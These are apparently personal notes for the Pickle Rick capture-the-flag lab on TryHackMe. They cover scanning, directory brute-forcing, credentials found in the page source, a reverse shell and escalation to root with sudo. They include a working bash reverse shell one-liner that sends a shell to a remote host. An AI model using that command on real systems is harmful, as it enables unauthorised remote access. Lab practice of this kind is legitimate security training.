# YOU USED A ONLINE [WRITEUP](https://medium.com/@twilsonthomaz/pickle-rick-tryhackme-writeup-f40990ab6f36) CUZ UR BAD

# Things to improve
- Which wordlist to use
- Recognizing possible passwords
- reverse shells
- privesc with sudo

## nmap
returns ssh port 22 and http port 80

## dirbuster
could only find good directories with **common.txt**
found robots.txt and login.php

## Found login details in web source code and robots.txt

## Found command entry and made a reverse shell
used [gtfobins](https://gtfobins.github.io/gtfobins/bash/)
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'

## Found 1st ingredient

## Found 2nd ingredient
went to rick's home directory

## Checked for sudo permissions
su -l

## sudo to root
sudo su

## Flag in root folder
